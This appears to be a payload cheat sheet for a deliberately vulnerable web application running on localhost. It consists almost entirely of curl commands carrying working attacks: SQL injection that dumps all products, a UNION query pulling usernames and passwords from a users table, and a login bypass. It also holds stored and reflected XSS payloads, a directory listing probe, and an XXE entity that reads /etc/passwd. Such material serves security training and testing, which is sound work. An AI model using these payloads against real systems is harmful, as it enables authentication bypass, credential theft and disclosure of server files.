# SQL Injection

## Products

### Show All

```bash
  curl "http://localhost:8081/api/products/test'%20OR%201=1--%20-"
```

### Union

```bash
  curl 'http://localhost:8081/api/products/Apple'"'"'%20UNION%20SELECT%20username,password%20FROM%20users--%20-'
```

## Login

### Login as admin

```bash
  curl -X POST 'http://localhost:8081/api/login?username=test%27%20OR%201%3D1%20LIMIT%201--%20-&password=test'
```
# XSS

## Stored

```bash
  curl -X PUT -d '{"description":"<img src=x onerror=alert(1)>"}' -H "Content-Type: application/json" http://localhost:8081/api/products/Apple
```

## Reflected

```bash
  http://localhost:8080/<img src=x onerror=alert(1)>
```

# Directory Listing

```bash
  curl "http://localhost:8081/images/"
```

# Unsigned JWT Token

```bash
  curl -X POST 'http://localhost:8081/api/login?username=admin&password=adminpassword'
```

# XEE

```bash
    curl -X POST \
     -H "Content-Type: application/xml" \
     --data '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE cart [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<cart>
<item>&xxe;</item>
</cart>' \
http://localhost:8081/api/cart
```